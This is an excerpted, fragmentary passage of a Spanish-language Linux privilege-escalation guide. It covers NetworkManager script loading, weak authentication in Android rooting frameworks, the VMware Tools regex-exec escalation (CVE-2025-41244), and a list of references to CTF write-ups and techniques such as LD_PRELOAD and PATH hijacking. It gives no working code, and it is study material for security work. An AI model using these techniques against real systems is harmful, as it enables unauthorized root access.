Los scripts de red, como _ifcg-eth0_, se utilizan para las conexiones de red. Tienen exactamente el mismo aspecto que los archivos .INI. Sin embargo, Network Manager (dispatcher.d) los ~carga~ en Linux.
...
### Escapando de Restricted Shells
...
Los Android rooting frameworks suelen hookear un syscall para exponer funcionalidades privilegiadas del kernel a un manager en userspace. Una autenticación débil del manager (por ejemplo, comprobaciones de firma basadas en el orden de los FD o esquemas de contraseñas deficientes) puede permitir que una app local suplante al manager y escale a root en dispositivos que ya tienen root. Obtén más información y detalles de explotación aquí:
...
## VMware Tools service discovery LPE (CWE-426) mediante exec basado en regex (CVE-2025-41244)

El service discovery basado en regex en VMware Tools/Aria Operations puede extraer una ruta binaria de las líneas de comandos de los procesos y ejecutarla con -v bajo un contexto privilegiado. Los patrones permisivos (por ejemplo, el uso de \S) pueden coincidir con listeners preparados por el atacante en ubicaciones con permisos de escritura (por ejemplo, /tmp/httpd), lo que permite la ejecución como root (CWE-426 Untrusted Search Path).<sup>[[27]](#references)</sup>

Obtén más información y consulta un patrón generalizado aplicable a otros stacks de discovery/monitoring aquí:
...
- [1] [0xdf – HTB Planning (Privesc mediante Crontab UI, reutilización de credenciales con zip -P)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
...
- [3] [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (secuestro de PATH mediante sudo env_keep)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
...
- [8] [¡Nadie esperaba la ejecución de comandos!](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [9] [Sudo (LD_PRELOAD) (Escalada de privilegios en Linux)](https://touhidshaikh.com/blog/?p=827)
- [10] [lpeworkshop – Guía de los ejercicios de laboratorio - Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
...
- [16] [Accede al D-BUS](https://www.linuxjournal.com/article/7744)
...
- [22] [0xdf – HTB Eureka (inyección aritmética de bash mediante logs, cadena completa)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
...
- [25] [0xdf – HTB Previous (sudo terraform dev_overrides + privesc mediante symlink de TF_VAR)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [26] [0xdf – HTB Slonik (copia de pg_basebackup mediante cron → bash SUID)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [27] [NVISO – Lo que nombres, VMware lo eleva (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
...
- [31] [PEP 3147 – Directorios de repositorios PYC](https://peps.python.org/pep-3147/)
- [32] [Documentación de Python importlib](https://docs.python.org/3/library/importlib.html)
- [33] [incidencia #74 de polkit/polkit](https://gitlab.freedesktop.org/polkit/polkit/issues/74)
